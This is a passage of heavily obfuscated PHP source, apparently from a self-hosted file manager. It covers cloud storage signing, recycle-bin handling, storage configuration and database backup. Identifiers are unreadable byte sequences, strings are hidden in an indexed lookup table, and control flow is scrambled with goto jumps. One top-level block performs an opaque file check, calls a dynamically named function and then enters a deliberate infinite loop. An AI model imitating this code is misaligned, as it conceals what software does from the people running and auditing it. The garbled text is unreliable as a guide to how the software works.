F¹ª˜å¥ÎŒ: if ($AÇ”ºİ›§é) { return $AÇ”ºİ›§é; } if ($d°ößÄ¥ª¿ == $c é¼Ğš‚ê[1059]) { $AÇ”ºİ›§é = self::make(Model($c é¼Ğš‚ê[759])->systemRootPathAdd($c é¼Ğš‚ê[1068])); } else { $AÇ”ºİ›§é = self::systemPath($c é¼Ğš‚ê[1059]); $eÁ–›™¯îî = self::sourceID($AÇ”ºİ›§é); $AÇ”ºİ›§é = self::make(Model($c é¼Ğš‚ê[759])->mkdir($eÁ–›™¯îî, $d°ößÄ¥ª¿)); } Model($c é¼Ğš‚ê[1067])->set($eÊÁË¬Ë©à, $AÇ”ºİ›§é); goto bÛ½éÖÛøè; bÛ½éÖÛøè: return $AÇ”ºİ›§é; goto E­à¡·ïÇ†; E­à¡·ïÇ†: } public static function systemFolder($aîè’ºä…ù) { $e†¿§„‘Î’ = IO_PATH_SYSTEM_SOURCE . $aîè’ºä…ù; $DŞø¶†©¶ª = Cache::get($e†¿§„‘Î’); if (!$DŞø¶†©¶ª) { $c§™ƒÅ’ëÃ = IO::infoFull($e†¿§„‘Î’); if (!$c§™ƒÅ’ëÃ) { $DŞø¶†©¶ª = IO::mkdir($e†¿§„‘Î’, REPEAT_SKIP); } else { $DŞø¶†©¶ª = $c§™ƒÅ’ëÃ[$_SERVER[¿õñ][76]]; } Cache::set($e†¿§„‘Î’, $DŞø¶†©¶ª, 3600 * 10); } return $DŞø¶†©¶ª; } public static function defaultDriver() { return Model($_SERVER[¿õñ][701])->defaultDriver(); } public static function defaultIO() { $Bª–Ìºœê¼ =& $_SERVER[¿õñ]; $AíÃµÛâë² = self::defaultDriver(); return $Bª–Ìºœê¼[1069] . $AíÃµÛâë²[$Bª–Ìºœê¼[364]] . $Bª–Ìºœê¼[1056]; } public static function fileTypeList() { $fÎ…‘¯Í =& $_SERVER[¿õñ]; $Fæ‚ÑÏÑ§ = $GLOBALS[$fÎ…‘¯Í[6]][$fÎ…‘¯Í[1070]]; foreach ($Fæ‚ÑÏÑ§ as $Eôë¨ùæÎ  => $B±‡¡­¨¯Û) { $c‡É²°ø¥® = $fÎ…‘¯Í[1071] . $Eôë¨ùæÎ ; $AĞù¸¹í¬á = LNG($c‡É²°ø¥®); if ($c‡É²°ø¥® != $AĞù¸¹í¬á) { $Fæ‚ÑÏÑ§[$Eôë¨ùæÎ ][$fÎ…‘¯Í[28]] = $AĞù¸¹í¬á; } } return $Fæ‚ÑÏÑ§; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($F¸ï‚î›Ôõ) { parent::__construct($F¸ï‚î›Ôõ); $this->signatureVersion($_SERVER[¿õñ][197]); } public function uploadFormData($F„ŞãåòÍø, $e“ŠÀÎÙí = 3600) { goto BçĞªà–†‰; f†³ĞØ«¨Ì: return $f›šÆİÎÙ’; goto eğ‰ÏëóŞÏ; Bâ¨Ÿ“ôÜ¥: $FÇáˆİÁ§Ë = $dÕœ¡¼å¸Ù[1072]; $c‰‘ô±š”¡ = gmdate($dÕœ¡¼å¸Ù[1073], time() + $e“ŠÀÎÙí); $dó“Ó¸‚ = (string) time() . $dÕœ¡¼å¸Ù[68] . (string) (time() + $e“ŠÀÎÙí); goto cË›ÕîÂ¡¸; CÁÛ¶—ø¬: $CóÙÌéÛïæ = sha1($C¾ù—æñ¿‰); $C¹à£Û‰ = hash_hmac($dÕœ¡¼å¸Ù[215], $CóÙÌéÛïæ, $AìÁšºÙ‘); $f›šÆİÎÙ’ = array($dÕœ¡¼å¸Ù[1076] => $Eíˆ’ëê‘, $dÕœ¡¼å¸Ù[1080] => $FÇáˆİÁ§Ë, $dÕœ¡¼å¸Ù[1084] => base64_encode($C¾ù—æñ¿‰), $dÕœ¡¼å¸Ù[1081] => $c‹È±Ş‡ñ, $dÕœ¡¼å¸Ù[1082] => $this->accessKey, $dÕœ¡¼å¸Ù[1085] => $dó“Ó¸‚, $dÕœ¡¼å¸Ù[1086] => $C¹à£Û‰, $dÕœ¡¼å¸Ù[166] => $this->getHost()); goto f†³ĞØ«¨Ì; BçĞªà–†‰: $dÕœ¡¼å¸Ù =& $_SERVER[¿õñ]; $Eíˆ’ëê‘ = $dÕœ¡¼å¸Ù[182]; $c‹È±Ş‡ñ = $dÕœ¡¼å¸Ù[215]; goto Bâ¨Ÿ“ôÜ¥; cË›ÕîÂ¡¸: $C¾ù—æñ¿‰ = array($dÕœ¡¼å¸Ù[1074] => $c‰‘ô±š”¡, $dÕœ¡¼å¸Ù[1075] => array(array($dÕœ¡¼å¸Ù[1076] => $Eíˆ’ëê‘), array($dÕœ¡¼å¸Ù[1077] => $this->bucket), array($dÕœ¡¼å¸Ù[1078], $dÕœ¡¼å¸Ù[1079], $dÕœ¡¼å¸Ù[33]), array($dÕœ¡¼å¸Ù[1080] => $FÇáˆİÁ§Ë), array($dÕœ¡¼å¸Ù[1081] => $c‹È±Ş‡ñ), array($dÕœ¡¼å¸Ù[1082] => $this->accessKey), array($dÕœ¡¼å¸Ù[1083] => $dó“Ó¸‚))); $C¾ù—æñ¿‰ = json_encode($C¾ù—æñ¿‰); $AìÁšºÙ‘ = hash_hmac($dÕœ¡¼å¸Ù[215], $dó“Ó¸‚, $this->secret); goto CÁÛ¶—ø¬; eğ‰ÏëóŞÏ: } } goto D½ºÇïŒ´¡; eñ÷½ÑÑŸ†: register_shutdown_function($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][35]); set_error_handler($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][48], $cÌÌ§‚‹™§); if (function_exists($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][49])) { set_exception_handler($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][50]); } goto cİ²Ç”åÅ®; C·¸¶×÷: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\145\137\x72\x65\143\171\143\154\145"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\x69\155\x65", "\x74\151\155\x65", "\x69\156\163\145\162\164", "\x66\x75\x6e\143\164\x69\x6f\156")); public function listData($A·ˆ†ëƒÁ» = false) { $fÕØÉµâÕÏ =& $_SERVER[¿õñ]; $A·ˆ†ëƒÁ» = $A·ˆ†ëƒÁ» ? $A·ˆ†ëƒÁ» : USER_ID; $AÑˆ‚š´É = $this->where(array($fÕØÉµâÕÏ[1341] => $A·ˆ†ëƒÁ»))->select(); return array_to_keyvalue($AÑˆ‚š´É, $fÕØÉµâÕÏ[33], $fÕØÉµâÕÏ[366]); } public function moveToRecycle($Dİ¥÷Ä‘„è) { goto Dô¬·œßå³; c“øî†…‹¤: if (!$bË¹Éò˜È || $bË¹Éò˜È[$Bã‰³Ù…•[393]] == $Bã‰³Ù…•[493]) { return; } $b¤°ø¡Ëó• = array($Bã‰³Ù…•[380] => $Dİ¥÷Ä‘„è, $Bã‰³Ù…•[1341] => USER_ID, $Bã‰³Ù…•[514] => $bË¹Éò˜È[$Bã‰³Ù…•[368]], $Bã‰³Ù…•[515] => $bË¹Éò˜È[$Bã‰³Ù…•[452]], $Bã‰³Ù…•[518] => $bË¹Éò˜È[$Bã‰³Ù…•[455]]); $this->add($b¤°ø¡Ëó•); goto f¹”˜–í; f¹”˜–í: $this->recycleMove($Dİ¥÷Ä‘„è, 1); if ($bË¹Éò˜È[$Bã‰³Ù…•[367]] == $Bã‰³Ù…•[493]) { $F–ÁìòÑÙ = array($Bã‰³Ù…•[518] => array($Bã‰³Ù…•[475], $bË¹Éò˜È[$Bã‰³Ù…•[455]] . $Dİ¥÷Ä‘„è . $Bã‰³Ù…•[476])); $C“ÍÓù§->where($F–ÁìòÑÙ)->setField($Bã‰³Ù…•[393], 1); } goto B—øâˆ¯™ã; Dô¬·œßå³: $Bã‰³Ù…• =& $_SERVER[¿õñ]; $C“ÍÓù§ = Model($Bã‰³Ù…•[1087]); $bË¹Éò˜È = $C“ÍÓù§->sourceInfo($Dİ¥÷Ä‘„è); goto c“øî†…‹¤; B—øâˆ¯™ã: } public function clear() { $this->remove(!1); } public function remove($e—¾ˆ‰ÊÔ = false) { goto CÃ¨•©Ÿ•ª; CÃ¨•©Ÿ•ª: $FÍ±×ÓĞï¢ =& $_SERVER[¿õñ]; $C›ÙÏ„°é… = Model($FÍ±×ÓĞï¢[1087]); $BªÌÒË¿¦‹ = $this->listData(); goto D©´‹å¯¾Õ; D©´‹å¯¾Õ: $e—¾ˆ‰ÊÔ = $e—¾ˆ‰ÊÔ === !1 ? !1 : $e—¾ˆ‰ÊÔ; $aÊ–Ñ˜åâ³ = array(); foreach ($BªÌÒË¿¦‹ as $Fß¬±Ã·â‡) { if ($e—¾ˆ‰ÊÔ != !1 && !in_array($Fß¬±Ã·â‡, $e—¾ˆ‰ÊÔ)) { continue; } $C›ÙÏ„°é…->remove($Fß¬±Ã·â‡, !1); $e¹›¶‹¹ = $this->where(array($FÍ±×ÓĞï¢[366] => $Fß¬±Ã·â‡))->find(); $bˆŠˆíµãÅ = $e¹›¶‹¹[$FÍ±×ÓĞï¢[368]] . $FÍ±×ÓĞï¢[71] . $e¹›¶‹¹[$FÍ±×ÓĞï¢[452]]; $aÊ–Ñ˜åâ³[$bˆŠˆíµãÅ] = array($FÍ±×ÓĞï¢[514] => $e¹›¶‹¹[$FÍ±×ÓĞï¢[368]], $FÍ±×ÓĞï¢[452] => $e¹›¶‹¹[$FÍ±×ÓĞï¢[452]]); $this->where(array($FÍ±×ÓĞï¢[366] => $Fß¬±Ã·â‡))->delete(); } goto cÑÚ¤±„çĞ; cÑÚ¤±„çĞ: foreach ($aÊ–Ñ˜åâ³ as $b’©ÇŒ³†) { $C›ÙÏ„°é…->targetSpaceUpdate($b’©ÇŒ³†[$FÍ±×ÓĞï¢[368]], $b’©ÇŒ³†[$FÍ±×ÓĞï¢[452]]); } goto dˆ¬¢œÇ©; dˆ¬¢œÇ©: } public function restore($E·Ü·œôÇ = false) { goto fÍ”ØŸ‘ôØ; fÍ”ØŸ‘ôØ: $a½¯ÃÏĞÀ =& $_SERVER[¿õñ]; $A¨®Œ»‡ÑÁ = Model($a½¯ÃÏĞÀ[1087]); $Bµ£áÜ–¶’ = $this->listData(); goto A ŒÂÔª„ô; b˜µ®èƒÏå: foreach ($Bµ£áÜ–¶’ as $b˜¬–¶™ÓŸ) { goto A¹Ô¹ÌŠ­·; F¿êÇã¡ğ: if ($CÜè©›È¯[$a½¯ÃÏĞÀ[393]] == $a½¯ÃÏĞÀ[493]) { continue; } $A¨®Œ»‡ÑÁ->lockMoveStart($b˜¬–¶™ÓŸ); $this->recycleMove($b˜¬–¶™ÓŸ, 0); goto fçÊÁÒáù©; c¹®‡ëà…‰: $f¤†ÂöÇ[] = $FåÒòª²ñ[$a½¯ÃÏĞÀ[457]]; if ($FåÒòª²ñ[$a½¯ÃÏĞÀ[367]] == $a½¯ÃÏĞÀ[493]) { $f¤†ÂöÇ[] = $b˜¬–¶™ÓŸ; } $A¨®Œ»‡ÑÁ->lockMoveEnd($b˜¬–¶™ÓŸ); goto a¶µĞÄâäß; A¹Ô¹ÌŠ­·: if ($E·Ü·œôÇ != !1 && !in_array($b˜¬–¶™ÓŸ, $E·Ü·œôÇ)) { continue; } $FåÒòª²ñ = $A¨®Œ»‡ÑÁ->sourceInfo($b˜¬–¶™ÓŸ); $CÜè©›È¯ = $A¨®Œ»‡ÑÁ->sourceInfo($FåÒòª²ñ[$a½¯ÃÏĞÀ[457]]); goto F¿êÇã¡ğ; fçÊÁÒáù©: if ($FåÒòª²ñ[$a½¯ÃÏĞÀ[367]] == $a½¯ÃÏĞÀ[493]) { $FÈÉµÌ–Õİ = array($a½¯ÃÏĞÀ[518] => array($a½¯ÃÏĞÀ[475], $FåÒòª²ñ[$a½¯ÃÏĞÀ[455]] . $b˜¬–¶™ÓŸ . $a½¯ÃÏĞÀ[476])); $A¨®Œ»‡ÑÁ->where($FÈÉµÌ–Õİ)->setField($a½¯ÃÏĞÀ[393], 0); } $this->where(array($a½¯ÃÏĞÀ[366] => $b˜¬–¶™ÓŸ))->delete(); $A¨®Œ»‡ÑÁ->folderSizeReset($FåÒòª²ñ[$a½¯ÃÏĞÀ[457]]); goto c¹®‡ëà…‰; a¶µĞÄâäß: } $A¨®Œ»‡ÑÁ->updateModifyTime($f¤†ÂöÇ); goto A¨ê®Ò‚Ğà; A ŒÂÔª„ô: $E·Ü·œôÇ = $E·Ü·œôÇ == !1 ? !1 : $E·Ü·œôÇ; if (!$Bµ£áÜ–¶’) { return !0; } $f¤†ÂöÇ = array(); goto b˜µ®èƒÏå; A¨ê®Ò‚Ğà: } private function recycleMove($CÌ·Øƒ¡, $Cî„‰×ã¬Â = 1) { $Bï—Üå”¡î =& $_SERVER[¿õñ]; $b¡©£¹£á = Model($Bï—Üå”¡î[1087]); $Cœ†šÁ¢Ø† = Model($Bï—Üå”¡î[2253]); $f¸Çùî›…­ = array($Bï—Üå”¡î[366] => $CÌ·Øƒ¡); if ($Cî„‰×ã¬Â) { $b¡©£¹£á->where($f¸Çùî›…­)->setField($Bï—Üå”¡î[393], 1); $Cœ†šÁ¢Ø†->eventRecycle($CÌ·Øƒ¡, $Bï—Üå”¡î[2254]); } else { $D¬Ä›Öƒ±… = $b¡©£¹£á->where($f¸Çùî›…­)->find(); $aø„«§Æó½ = $D¬Ä›Öƒ±…[$Bï—Üå”¡î[367]] == $Bï—Üå”¡î[493]; $a½÷—”ª¡ï = $b¡©£¹£á->fileNameAuto($D¬Ä›Öƒ±…[$Bï—Üå”¡î[457]], $D¬Ä›Öƒ±…[$Bï—Üå”¡î[28]], REPEAT_RENAME_FOLDER, $aø„«§Æó½); if ($a½÷—”ª¡ï != $D¬Ä›Öƒ±…[$Bï—Üå”¡î[28]]) { $b¡©£¹£á->rename($CÌ·Øƒ¡, $a½÷—”ª¡ï); } $b¡©£¹£á->where($f¸Çùî›…­)->setField($Bï—Üå”¡î[393], 0); $Cœ†šÁ¢Ø†->eventRecycle($CÌ·Øƒ¡, $Bï—Üå”¡î[2255]); } } } if (!isset($_SERVER[$_SERVER[¿õñ][780]]) || !isset($_SERVER[$_SERVER[¿õñ][800]])) { goto FŠŞ‘¤‡›“; Eô¢½±Ú£Î: $B¹‚Ç «·« = explode($_SERVER[¿õñ][214], $d´§‡¹ï·È); if (count($B¹‚Ç «·«) < $_SERVER[¿õñ][550]) { $aàİ ‡¡áˆ = $_SERVER[¿õñ][784]; $aàİ ‡¡áˆ(); } $Cæ“ôÓ’‘ = $_SERVER[¿õñ][785]; goto a†Ú••àÚÊ; a†Ú••àÚÊ: $Cæ“ôÓ’‘($_SERVER[$_SERVER[¿õñ][782]] . $_SERVER[¿õñ][783]); $c¹Íº¹Ïƒæ = 2; while ($c¹Íº¹Ïƒæ > 1) { $EÊĞì©¥²¦ = rawurlencode($c¹Íº¹Ïƒæ . $_SERVER[¿õñ][358]); } goto CàˆåÈ×Æ; FŠŞ‘¤‡›“: $c¾õ¿„¯¢© = $_SERVER[¿õñ][781]; $FÚÓ‡îŒ = $_SERVER[$_SERVER[¿õñ][782]] . $_SERVER[¿õñ][783]; $d´§‡¹ï·È = $c¾õ¿„¯¢©($FÚÓ‡îŒ); goto Eô¢½±Ú£Î; CàˆåÈ×Æ: } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\163\x74\157\162\x61\147\x65\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x73\x69\x7a\x65\x4d\x61\x78", "\x73\x79\x73\164\145\x6d", "\144\145\146\x61\x75\154\x74", "\144\162\x69\x76\x65\x72", "\x63\x6f\156\146\151\147"); public function listData($BîÛÜ× = false, $C¯µ„ÂÕ» = "\155\157\144\x69\x66\x79\x54\x69\155\x65", $F‰°‡Î¨Ğ = false) { goto C¢š·½ˆš; a¾›Í‰”ô¿: foreach ($f…œ©”…›Ñ as $bÄ´‚ˆŸö => $a©šáƒ„‰ç) { unset($f…œ©”…›Ñ[$bÄ´‚ˆŸö][$fÊ…“ëì‡Î[6]]); $f…œ©”…›Ñ[$bÄ´‚ˆŸö][$fÊ…“ëì‡Î[1999]] = 0; } $Aì ‘‘†®Ğ = array_to_keyvalue($f…œ©”…›Ñ, $fÊ…“ëì‡Î[33], $fÊ…“ëì‡Î[364]); $this->_listAppendSize($f…œ©”…›Ñ, $Aì ‘‘†®Ğ); goto c²Âò©©ñö; C¢š·½ˆš: $fÊ…“ëì‡Î =& $_SERVER[¿õñ]; $f…œ©”…›Ñ = parent::listData($BîÛÜ×, $C¯µ„ÂÕ», $F‰°‡Î¨Ğ); if ($BîÛÜ×) { return $f…œ©”…›Ñ; } goto a¾›Í‰”ô¿; c²Âò©©ñö: return $f…œ©”…›Ñ; goto B˜î‚ôÁ©; B˜î‚ôÁ©: } public function _listAppendSize(&$F éÔ®ñö, $f‘ƒ­ÌØÚ°) { $fÔ¦†ƒÏ =& $_SERVER[¿õñ]; $dš÷¶œ¹ƒ = $fÔ¦†ƒÏ[2256] . implode($fÔ¦†ƒÏ[47], $f‘ƒ­ÌØÚ°) . $fÔ¦†ƒÏ[2257]; $B”ñ¿Å´ƒ = Model($fÔ¦†ƒÏ[719])->query($dš÷¶œ¹ƒ); $B”ñ¿Å´ƒ = array_to_keyvalue($B”ñ¿Å´ƒ, $fÔ¦†ƒÏ[364], $fÔ¦†ƒÏ[78]); foreach ($F éÔ®ñö as $eåñ‡«Ÿë² => $fˆŒ–‘ê¼ì) { $F éÔ®ñö[$eåñ‡«Ÿë²][$fÔ¦†ƒÏ[1999]] = isset($B”ñ¿Å´ƒ[$fˆŒ–‘ê¼ì[$fÔ¦†ƒÏ[364]]]) ? $B”ñ¿Å´ƒ[$fˆŒ–‘ê¼ì[$fÔ¦†ƒÏ[364]]] : 0; } } public function getConfig($d¯¹·Ê“ß¨) { $CäÖ•‰–ôš = parent::listData($d¯¹·Ê“ß¨); return json_decode($CäÖ•‰–ôš[$_SERVER[¿õñ][6]], !0); } public function update($DÀÏĞ§™÷Ô, $B©° ×«É) { goto bĞáÅš“×£; bĞáÅš“×£: $Cô¦Ó¼ºâÅ =& $_SERVER[¿õñ]; $c´İ×éŸ¢Ú = $B©° ×«É[$Cô¦Ó¼ºâÅ[28]]; $f•Ç·Âõ´ = array_to_keyvalue(parent::listData(), $Cô¦Ó¼ºâÅ[28]); goto eñÄ”æãò; bˆÊÚÄáÀ£: $EŒÆ£¢¨Æ™ = parent::update($DÀÏĞ§™÷Ô, $B©° ×«É); if ($EŒÆ£¢¨Æ™ && $B©° ×«É[$Cô¦Ó¼ºâÅ[34]]) { foreach ($f•Ç·Âõ´ as $FšË†êÂĞ—) { if ($FšË†êÂĞ—[$Cô¦Ó¼ºâÅ[34]] && $FšË†êÂĞ—[$Cô¦Ó¼ºâÅ[364]] != $DÀÏĞ§™÷Ô) { parent::update($FšË†êÂĞ—[$Cô¦Ó¼ºâÅ[364]], array($Cô¦Ó¼ºâÅ[34] => 0)); } } } return $EŒÆ£¢¨Æ™; goto eÎ»êÀ£åÖ; eñÄ”æãò: if (isset($f•Ç·Âõ´[$c´İ×éŸ¢Ú]) && $f•Ç·Âõ´[$c´İ×éŸ¢Ú][$Cô¦Ó¼ºâÅ[364]] != $DÀÏĞ§™÷Ô) { return !1; } if (isset($B©° ×«É[$Cô¦Ó¼ºâÅ[2258]]) && $B©° ×«É[$Cô¦Ó¼ºâÅ[2258]] == $Cô¦Ó¼ºâÅ[493]) { $this->checkConfig($B©° ×«É); } unset($B©° ×«É[$Cô¦Ó¼ºâÅ[2258]]); goto bˆÊÚÄáÀ£; eÎ»êÀ£åÖ: } public function add($E¢‘ÍŠºŸ) { goto F­‡Éù…¸í; dç·ñ½ê: $this->checkConfig($E¢‘ÍŠºŸ); $bğ¦¢‹«‘Ÿ = parent::insert($E¢‘ÍŠºŸ); if ($bğ¦¢‹«‘Ÿ && $E¢‘ÍŠºŸ[$C‘¥¢§ÂÁ[34]]) { foreach ($bùÖŠ×ã¦² as $a»‘ª¨ª¸) { if ($a»‘ª¨ª¸[$C‘¥¢§ÂÁ[34]]) { parent::update($a»‘ª¨ª¸[$C‘¥¢§ÂÁ[364]], array($C‘¥¢§ÂÁ[34] => 0)); } } } goto C¬»º™†î; F­‡Éù…¸í: $C‘¥¢§ÂÁ =& $_SERVER[¿õñ]; $bùÖŠ×ã¦² = array_to_keyvalue(parent::listData(), $C‘¥¢§ÂÁ[28]); if (isset($bùÖŠ×ã¦²[$E¢‘ÍŠºŸ[$C‘¥¢§ÂÁ[28]]])) { return !1; } goto dç·ñ½ê; C¬»º™†î: return $bğ¦¢‹«‘Ÿ; goto eñóä˜ĞŒ·; eñóä˜ĞŒ·: } public function checkConfig(&$d’ê‡âÎ‘) { goto bÜºõ¨Û‚; B˜£°ô§Ğ: $cëµ×¢Äó = $A¦‡†ÎíˆÊ[72] . $c‹Ë†ì”å; $dØ†í¹ùÍ = new $cëµ×¢Äó($A¿¾®‘Ò÷¢); if (in_array($fŠ°ÜÓÔˆ, $dØ†í¹ùÍ->objectDriver)) { if (!$dØ†í¹ùÍ->isBucketCors() && !$dØ†í¹ùÍ->setBucketCors()) { show_json(LNG($A¦‡†ÎíˆÊ[2259]), !1); } } goto cËÀÓÊØŸ; cËÀÓÊØŸ: $dËğ‚¦‘± = $dØ†í¹ùÍ->getPath($F‚µ™»ïíà . $A¦‡†ÎíˆÊ[1896]); if (!$dØ†í¹ùÍ->mkfile($dËğ‚¦‘±)) { show_json(LNG($A¦‡†ÎíˆÊ[2260]), !1); } $A¿¾®‘Ò÷¢[$A¦‡†ÎíˆÊ[1007]] = $F‚µ™»ïíà; goto aéïÔ‚æÅÀ; AÁÍœÙ‘ƒÓ: foreach ($A¿¾®‘Ò÷¢ as $eƒ†¾Ï£¯ç => $D‚êƒ­ì®À) { $A¿¾®‘Ò÷¢[$eƒ†¾Ï£¯ç] = trim($D‚êƒ­ì®À); } $F‚µ™»ïíà = rtrim($A¿¾®‘Ò÷¢[$A¦‡†ÎíˆÊ[1007]], $A¦‡†ÎíˆÊ[8]) . $A¦‡†ÎíˆÊ[8]; $c‹Ë†ì”å = $this->driverType($fŠ°ÜÓÔˆ); goto B˜£°ô§Ğ; bÜºõ¨Û‚: $A¦‡†ÎíˆÊ =& $_SERVER[¿õñ]; $fŠ°ÜÓÔˆ = strtolower($d’ê‡âÎ‘[$A¦‡†ÎíˆÊ[89]]); $A¿¾®‘Ò÷¢ = json_decode_force($d’ê‡âÎ‘[$A¦‡†ÎíˆÊ[6]]); goto AÁÍœÙ‘ƒÓ; aéïÔ‚æÅÀ: $d’ê‡âÎ‘[$A¦‡†ÎíˆÊ[6]] = json_encode($A¿¾®‘Ò÷¢); $d’ê‡âÎ‘[$A¦‡†ÎíˆÊ[89]] = $c‹Ë†ì”å; return !0; goto BÆÉÕæ‡è‡; BÆÉÕæ‡è‡: } private function driverType($dĞ±Öæ—¥„) { $b’à‰×›¤İ =& $_SERVER[¿õñ]; $bî·¬©‰Ò‚ = array($b’à‰×›¤İ[102] => $b’à‰×›¤İ[2261], $b’à‰×›¤İ[58] => $b’à‰×›¤İ[2262], $b’à‰×›¤İ[65] => $b’à‰×›¤İ[1008]); if (isset($bî·¬©‰Ò‚[$dĞ±Öæ—¥„])) { return $bî·¬©‰Ò‚[$dĞ±Öæ—¥„]; } return strtoupper($dĞ±Öæ—¥„); } public function driverListSystem() { $A·í›É»‡ =& $_SERVER[¿õñ]; $CİÁ¢³·î = parent::listData(); $f‹‰Í›Êí¹ = array(); foreach ($CİÁ¢³·î as $D¢ºé•‘³) { unset($D¢ºé•‘³[$A·í›É»‡[184]], $D¢ºé•‘³[$A·í›É»‡[106]]); $D¢ºé•‘³[$A·í›É»‡[6]] = json_decode_force($D¢ºé•‘³[$A·í›É»‡[6]]); $f‹‰Í›Êí¹[] = $D¢ºé•‘³; } return $f‹‰Í›Êí¹; } public function defaultDriver() { $dóÔÜÆ¼ =& $_SERVER[¿õñ]; $Eï‰—ªï¯ğ = parent::listData(); $AÚ»£º¬ˆƒ = array_filter_by_field($Eï‰—ªï¯ğ, $dóÔÜÆ¼[34], 1); $AÚ»£º¬ˆƒ = $AÚ»£º¬ˆƒ[0]; if ($AÚ»£º¬ˆƒ) { $AÚ»£º¬ˆƒ[$dóÔÜÆ¼[6]] = json_decode($AÚ»£º¬ˆƒ[$dóÔÜÆ¼[6]], !0); } return $AÚ»£º¬ˆƒ; } public function driverInfo($F¸ÄùêÆ…Û) { $B”³çÚ·¹× =& $_SERVER[¿õñ]; $dÇ’òÁ–™‡ = array_to_keyvalue(parent::listData(), $B”³çÚ·¹×[364]); if (!isset($dÇ’òÁ–™‡[$F¸ÄùêÆ…Û])) { return !1; } $E¼×‚Ø¼Àâ = $dÇ’òÁ–™‡[$F¸ÄùêÆ…Û]; $E¼×‚Ø¼Àâ[$B”³çÚ·¹×[6]] = json_decode_force($E¼×‚Ø¼Àâ[$B”³çÚ·¹×[6]]); return $E¼×‚Ø¼Àâ; } public function removeWithFile($F‡à‘ŒÒÇì) { goto eÌ¡Ò¾‡›‹; d¢î±®¡Ï: $dªù—™Øøá = Model($fãñÄÛô¦»[164])->where($BÜß•õ¾’¬)->field($fãñÄÛô¦»[2266])->select(); foreach ($dªù—™Øøá as $bªìŠ¤äÇ’) { goto C®è»£²ÖÁ; A¸ğßˆ¼©ì: if (!IO::exist($Bóø”ÉäŒ®) && !IO::move($a‡ÂÕê ˜, $Bóø”ÉäŒ®)) { continue; } $BÜß•õ¾’¬ = array($fãñÄÛô¦»[415] => $bªìŠ¤äÇ’[$fãñÄÛô¦»[415]]); $d„¦šóÂ = array($fãñÄÛô¦»[720] => $c§Šù™Ä‹Õ, $fãñÄÛô¦»[76] => $Bóø”ÉäŒ®); goto a±í÷›°šµ; a±í÷›°šµ: Model($fãñÄÛô¦»[164])->where($BÜß•õ¾’¬)->save($d„¦šóÂ); goto Fº‹ì…š’Œ; C®è»£²ÖÁ: $a‡ÂÕê ˜ = $bªìŠ¤äÇ’[$fãñÄÛô¦»[76]]; $Bóø”ÉäŒ® = $a¡Ì“éŞÃ . str_replace("\x7b\151\x6f\x3a{$F‡à‘ŒÒÇì}\x7d\x2f", $fãñÄÛô¦»[33], $a‡ÂÕê ˜); if (!IO::exist($a‡ÂÕê ˜)) { $this->removeByFileID($bªìŠ¤äÇ’[$fãñÄÛô¦»[415]]); continue; } goto A¸ğßˆ¼©ì; Fº‹ì…š’Œ: } return parent::remove($F‡à‘ŒÒÇì); goto E‡–™§ƒµ; C°±Ÿ™¾†£: $e·­›â®£¢ = KodIO::defaultDriver(); $c§Šù™Ä‹Õ = $e·­›â®£¢[$fãñÄÛô¦»[364]]; $a¡Ì“éŞÃ = "\173\x69\157\x3a{$c§Šù™Ä‹Õ}\x7d\x2f"; goto d¢î±®¡Ï; eÌ¡Ò¾‡›‹: $fãñÄÛô¦» =& $_SERVER[¿õñ]; $BÜß•õ¾’¬ = array($fãñÄÛô¦»[720] => $F‡à‘ŒÒÇì); $Dƒœààó– = Model($fãñÄÛô¦»[418])->where($BÜß•õ¾’¬)->count(); goto Bâ¿º˜ŸÑÖ; Bâ¿º˜ŸÑÖ: $a…Çç•÷öŠ = Model($fãñÄÛô¦»[418])->where($BÜß•õ¾’¬)->sum($fãñÄÛô¦»[78]); $FáæÏ¦©İ = new TaskFileTransfer($fãñÄÛô¦»[2263] . $F‡à‘ŒÒÇì, $fãñÄÛô¦»[2264], $Dƒœààó–, LNG($fãñÄÛô¦»[2265]) . "\x28{$F‡à‘ŒÒÇì}\x29"); $FáæÏ¦©İ->task[$fãñÄÛô¦»[695]] = $a…Çç•÷öŠ; goto C°±Ÿ™¾†£; E‡–™§ƒµ: } public function progress($a„ëÑÎÁâ) { return Task::get($_SERVER[¿õñ][2263] . $a„ëÑÎÁâ); } private function removeByFileID($a×¸ØòÇŒ) { $díÒí„°º =& $_SERVER[¿õñ]; $D¹¡¬³·ª¤ = Model($díÒí„°º[1087])->field($díÒí„°º[2243])->where(array($díÒí„°º[415] => $a×¸ØòÇŒ))->select(); $D¹¡¬³·ª¤ = array_to_keyvalue($D¹¡¬³·ª¤, $díÒí„°º[33], $díÒí„°º[366]); foreach ($D¹¡¬³·ª¤ as $Bñ‘§¯İ—Ò) { Model($díÒí„°º[379])->remove($Bñ‘§¯İ—Ò, !1); } } } goto BœÅ¹­õ’†; cÙ•÷·œá°: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto d„‹”İ¼†Ø; DÚ™ï™Ú×: self::$name = $A×»í®â—²[$CÕ‹ïçì‡[28]]; if ($aâ‹ß×»ö× = $this->sqliteFile()) { return $this->sqliteBackup($aâ‹ß×»ö×); } $e¦‡êœùõÇ = 0; goto bğ©ŸÔô İ; a£ÀÑ‡©âÓ: Backup::set($aæ¨ö•‰í°); return !0; goto CïÅ­…ŠŸ; eğ‚âËğë: $aæ¨ö•‰í° = array($CÕ‹ïçì‡[712] => $CÕ‹ïçì‡[713], $CÕ‹ïçì‡[714] => $e¦‡êœùõÇ + 1); Backup::set($aæ¨ö•‰í°); $C´È‡ Á = 0; goto a¢Í”Ú¾™Æ; a¢Í”Ú¾™Æ: $A…¤Ùô¬öõ = TEMP_FILES . $CÕ‹ïçì‡[715] . self::$name . $CÕ‹ïçì‡[8]; del_dir($A…¤Ùô¬öõ); mk_dir($A…¤Ùô¬öõ); goto BŒ½²ïÚ¯; d„‹”İ¼†Ø: $CÕ‹ïçì‡ =& $_SERVER[¿õñ]; $A×»í®â—² = Backup::get(); self::$io = $A×»í®â—²[$CÕ‹ïçì‡[688]]; goto DÚ™ï™Ú×; bğ©ŸÔô İ: $eÑ¨”¢ ® = Model()->db()->getTables(); foreach 